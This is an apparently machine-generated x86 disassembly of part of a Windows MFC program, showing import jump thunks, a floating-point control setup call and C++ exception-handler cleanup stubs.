push 0x0
push eax
push ecx
push edx
call sub_4064a0
add esp 0x14
retn
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_4068cc
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_4068de
xor eax eax
retn
sub_4068e1
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
Ordinal_MFC42u_800
jmp [ Ordinal_MFC42u_800@IAT ]
Ordinal_MFC42u_2910
jmp [ Ordinal_MFC42u_2910@IAT ]
Ordinal_MFC42u_2914
jmp [ Ordinal_MFC42u_2914@IAT ]
Ordinal_MFC42u_540
jmp [ Ordinal_MFC42u_540@IAT ]
sub_406910
mov eax [ ebp - 0x10 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_40691b
mov eax r--data
jmp __CxxFrameHandler
sub_406930
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_4016f0
sub_40693b
mov eax r--data
jmp __CxxFrameHandler
sub_406950
lea ecx [ ebp - 0x830 ]
jmp Ordinal_MFC42u_800
sub_40695b
lea ecx [ ebp - 0x834 ]
jmp Ordinal_MFC42u_800
sub_406966
mov eax r--data
jmp __CxxFrameHandler
sub_406970
mov eax [ ebp - 0x10 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_40697b
mov eax r--data
jmp __CxxFrameHandler
